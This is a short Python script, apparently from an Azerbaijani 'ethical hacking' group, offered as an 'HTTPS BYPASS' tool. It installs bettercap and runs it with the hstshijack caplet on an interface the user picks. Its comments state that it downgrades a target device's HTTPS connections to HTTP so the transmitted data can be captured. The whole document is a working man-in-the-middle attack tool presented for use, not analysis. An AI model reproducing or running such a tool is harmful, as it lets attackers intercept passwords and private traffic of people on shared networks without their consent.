# Azərbaycan dilində intefeysi olan alət.
# HTTPS BYPASS O.G.A aləti işə salınıdqdan sonra
# Hədəf qurğunun HTTPS ötürmələrini HTTP protokolu ilə əvəzləyir,
# hədəf qurğunun ötürdüyü məlumatları əldə etmək imkanı yaradır.
# Hazırladı Orxan Bayramov.
# Yazılım dili Python 3
# 2021-ci il https://www.kht.az
#!/usr/bin/env python3
import subprocess
import netifaces
import sys

def print_banner():
    subprocess.call("clear", shell=True)
    print("""
██   ██ ██   ██  █████   ██████   █████  ███    ██    AZERBAIJAN
██  ██  ██   ██ ██   ██ ██       ██   ██ ████   ██      ETHICAL
█████   ███████ ███████ ██   ███ ███████ ██ ██  ██      HACKING
██  ██  ██   ██ ██   ██ ██    ██ ██   ██ ██  ██ ██       TEAM
██   ██ ██   ██ ██   ██  ██████  ██   ██ ██   ████  https://kht.az

HTTPS bağlantıda SSL-TLS şıfrələnmənin ləğvi      HTTPS BYPASS
---------------------------------------------------------------------
""")

def check_and_install_requirements():
    print(" [+] Tələblərin yoxlanması...")

    # Check for Python 3
    if sys.version_info[0] < 3:
        print(" [!] Python 3 tələb olunur. Python 3 quraşdırın.")
        sys.exit(1)

    # Check for required Python packages (netifaces)
    try:
        import netifaces
    except ImportError:
        print(" [*] Tələb olunan Python paketlərinin quraşdırılması...")
        subprocess.call(["sudo", "apt", "install", "python3-pip", "-y"])
        subprocess.call(["pip3", "install", "netifaces"])

    # Check for Bettercap
    if subprocess.call(["which", "bettercap"]) != 0:
        print(" [*] Bettercap quraşdırılır...")
        subprocess.call(["sudo", "apt", "install", "bettercap", "-y"])
    else:
        print(" [*] Bettercap quraşdırılmışdır.")

def start_bypass():
    print(" [+] Şəbəkə interfeysi seçin:\n")
    interfaces = netifaces.interfaces()
    interfaces.remove("lo")  # Loopback interfeysini çıxarın
    for i, interface in enumerate(interfaces, start=1):
        print(f" {i}. {interface}")

    try:
        choice = int(input("\n [*] İnterfeys nömrəsini daxil edin: "))
        if 1 <= choice <= len(interfaces):
            selected_interface = interfaces[choice - 1]
            print(f" [*] HTTPS Keçid başladılır - {selected_interface} üzərində...")
            subprocess.call(["sudo", "bettercap", "-iface", selected_interface, "-caplet", "hstshijack/hstshijack"])
        else:
            print(" [!] Yanlış seçim. Zəhmət olmasa doğru interfeys seçin.")
    except KeyboardInterrupt:
        print("\n [!] Skript dayandırıldı.")
    except ValueError:
        print(" [!] Yanlış daxil etdiniz. Zəhmət olmasa nömrə daxil edin.")

if __name__ == "__main__":
    try:
        print_banner()
        print(" [*] Çıxış üçün, CTRL + C düyməsini basın\n")
        check_and_install_requirements()
        start_bypass()
    except KeyboardInterrupt:
        print("\n [!] Skript dayandırıldı.")
